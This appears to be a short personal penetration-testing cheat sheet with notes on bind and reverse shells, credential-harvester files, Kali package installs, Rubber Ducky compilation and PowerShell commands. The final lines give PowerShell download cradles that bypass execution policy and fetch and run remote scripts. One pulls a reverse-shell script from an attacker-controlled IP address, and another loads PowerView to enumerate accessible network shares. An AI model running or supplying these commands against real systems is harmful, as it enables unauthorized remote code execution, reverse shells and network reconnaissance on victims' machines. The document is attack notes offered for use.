# Kill the process running apache
sudo netstat -tulpn | grep :80 && sudo Kill <PID>

# Find the credential harvester information
/var/www/html

# Bind Shell
Listener on the victim machine; Attacker connects to them

# Reverse Shell
Listener on the attacker machine; Victim connects to them

# Install a kali package on your machine
1. Add the debian sources to your apt list
2. Trust the keys
3. sudo apt install -t kali-rolling <package>

# Find out if a port is active
sudo netstat -anpe | grep 8888

# Compile a Rubber Ducky Script
java -jar [duckencoder file path] -i [the input text file] -o [the output file to be generated]

# Change Execution Policy on powershell, elevate privileges
Set‐ExecutionPolicy Unrestricted

# Download directly from powershell on Windows
 IEX (New‐Object Net.WebClient).DownloadString('http://10.0.20.140/ps.reverse.ps1')
 
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

